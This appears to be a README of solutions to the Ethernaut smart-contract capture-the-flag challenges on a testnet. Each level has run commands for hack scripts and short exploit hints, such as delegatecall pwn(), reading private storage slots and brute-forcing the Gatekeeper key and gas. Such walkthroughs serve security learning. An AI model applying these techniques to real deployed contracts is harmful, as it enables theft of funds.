# Ethernaut

## Coin Flip

Set up the `.env` file with your HTTP_ENDPOINT, PRIVATE_KEY and coin flip instance address.

```dotenv
PRIVATE_KEY="0x0000000000000000000000000000000000000000000000000000000000000000"
HTTP_ENDPOINT="https://eth-rinkeby.alchemyapi.io/v2/xxx"
COIN_FLIP_ADDR="0x0000000000000000000000000000000000000000"
```

run

```bash
npx hardhat run scripts/coin_flip_hack.js --network rinkeby
```

## Delegation

```js
await contract.sendTransaction({data: web3.eth.abi.encodeFunctionSignature("pwn()")})
```

## Force

Set your force contract address in `.env`.

```
FORCE_ADDR="0x0000000000000000000000000000000000000000"
```

run

```bash
npx hardhat run scripts/force_hack.js --network rinkeby
```

references:
- https://ethereum.stackexchange.com/questions/63987/can-a-contract-with-no-payable-function-have-ether/63988#63988
- https://solidity-by-example.org/hacks/self-destruct/ 

## Vault

Get the password with below command run in console.

```
await web3.eth.getStorageAt(instance, 1, console.log)
```

You can use [etherscan](https://rinkeby.etherscan.io) to run the `unlock` function.

## King

Set your king contract address in `.env`.

```
KING_ADDR="0x0000000000000000000000000000000000000000"
```

run

```bash
npx hardhat run scripts/king_hack.js --network rinkeby
```

## Reentrance

Set your reentrance contract address in `.env`.

```
REENTRANCE_ADDR="0x0000000000000000000000000000000000000000"
```

run

```bash
npx hardhat run scripts/reentrance_hack.js --network rinkeby
```

## Elevator

Set your elevator contract address in `.env`.

```
ELEVATOR_ADDR="0x0000000000000000000000000000000000000000"
```

run

```bash
npx hardhat run scripts/elevator_hack.js --network rinkeby
```

## Privacy

```solidity
contract Privacy {
  // slot 0
  bool public locked = true;
  // slot 1
  uint256 public ID = block.timestamp;
  // slot 2
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  // slot 3,4,5
  bytes32[3] private data;
}
```

Set your privacy contract address in `.env`.

```
PRIVACY_ADDR="0x0000000000000000000000000000000000000000"
```

run

```bash
npx hardhat run scripts/privacy_hack.js --network rinkeby
```

- https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html
- https://solidity-by-example.org/hacks/accessing-private-data/
- https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#eth-sendtransaction

## Gatekeeper One

```
bytes8 key = '0x1122334455667788'
uint16(uint64(key))  // 0x7788
uint32(uint64(key))  // 0x55667788

// it means _gateKey[4:6] == 0
uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
// it means _gateKey[0:4] != 0x0
uint32(uint64(_gateKey)) != uint64(_gateKey)
// it means _gateKey[6:8] = tx.origin[18:20]
uint32(uint64(_gateKey)) == uint16(tx.origin)
```

add hardhat fork settings

```js
module.exports = {
  networks: {
    hardhat: {
      forking: {
        url: process.env.HTTP_ENDPOINT,
      }
    },
    rinkeby: {
      url: process.env.HTTP_ENDPOINT,
      accounts: [process.env.PRIVATE_KEY],
    }
  },
  solidity: "0.6.12",
};
```

add `.env` settings

```dotenv
GATEKEEPER_ONE_ADDR=0x0000000000000000000000000000000000000000
```

run

```bash
npx hardhat test test/gatekeeper_one.js
```

```
try gasLimit: 900000
......
try gasLimit: 901264
entrant: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
entrant: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
    ✓ GatekeeperOne (23173ms)


  1 passing (23s)
```

We can know the tryGas is 901264.

run

```bash
npx hardhat run scripts/gatekeeper_one_hack.js --network rinkeby
```

# Gatekeeper Two

Set your gatekeeper_two contract address in `.env`.

```
GATEKEEPER_TWO="0x0000000000000000000000000000000000000000"
```

run

```bash
npx hardhat run scripts/gatekeeper_two_hack.js --network rinkeby
```

references
- https://ethereum.stackexchange.com/questions/45095/how-could-msg-sender-tx-origin-and-extcodesizecaller-0-be-true
- https://ethereum.stackexchange.com/questions/98700/find-address-of-a-contract-before-deployment-in-hardhat-and-ethers-js

